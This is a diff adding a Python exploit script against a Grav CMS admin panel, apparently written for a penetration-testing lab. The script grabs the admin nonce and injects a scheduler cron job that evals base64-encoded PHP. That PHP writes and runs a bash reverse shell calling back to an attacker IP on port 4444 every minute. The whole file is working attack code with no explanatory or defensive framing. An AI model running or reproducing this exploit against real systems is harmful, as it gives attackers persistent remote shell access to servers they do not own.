@@ -1,0 +1,67 @@
+
+
+import requests
+import sys
+import re
+import base64
+
+# --- CONFIGURATION ---
+target = "http://192.168.204.12/grav-admin"
+attacker_ip = "192.168.45.229"
+attacker_port = "4444"
+
+# 1. Generate the Base64 reverse shell string for the PHP file_put_contents
+# This corresponds to: bash -i >& /dev/tcp/192.168.45.229/4444 0>&1
+rev_shell_raw = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
+rev_shell_b64 = base64.b64encode(rev_shell_raw.encode()).decode()
+
+# 2. Construct the PHP payload that will be written to the scheduler
+payload = f"""/*<?php /**/
+file_put_contents('/tmp/rev.sh',base64_decode('{rev_shell_b64}'));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
+""".encode()
+
+s = requests.Session()
+
+print(f"[*] Targeting: {target}")
+print(f"[*] Attacker listener: {attacker_ip}:{attacker_port}")
+
+# Step 1: Get the admin-nonce from the login page
+try:
+    r = s.get(target + "/admin")
+    match = re.search(r'admin-nonce" value="(.*)"', r.text)
+    if not match:
+        print("[-] Could not find admin-nonce. Is the path correct?")
+        sys.exit(1)
+    
+    adminNonce = match.group(1)
+    print(f"[+] Found admin-nonce: {adminNonce}")
+
+    # Step 2: Inject the malicious job into the scheduler configuration
+    url = target + "/admin/config/scheduler" # Corrected endpoint for config update
+    
+    # Building the POST data
+    # We are injecting a 'custom_job' named 'ncefs' that runs every minute (*)
+    data = {
+        "admin-nonce": adminNonce,
+        "task": "SaveDefault",
+        "data[custom_jobs][ncefs][command]": "/usr/bin/php",
+        "data[custom_jobs][ncefs][args]": f"-r eval(base64_decode('{base64.b64encode(payload).decode()}'));",
+        "data[custom_jobs][ncefs][at]": "* * * * *",
+        "data[custom_jobs][ncefs][output]": "",
+        "data[status][ncefs]": "enabled",
+        "data[custom_jobs][ncefs][output_mode]": "append"
+    }
+
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    
+    print("[*] Sending exploit payload to scheduler...")
+    r = s.post(url, data=data, headers=headers)
+
+    if r.status_code == 200:
+        print("[+] Scheduler updated successfully!")
+        print("[*] Waiting for cron job to trigger (this may take up to 1 minute)...")
+    else:
+        print(f"[-] Failed to update scheduler. Status code: {r.status_code}")
+
+except Exception as e:
+    print(f"[-] An error occurred: {e}")
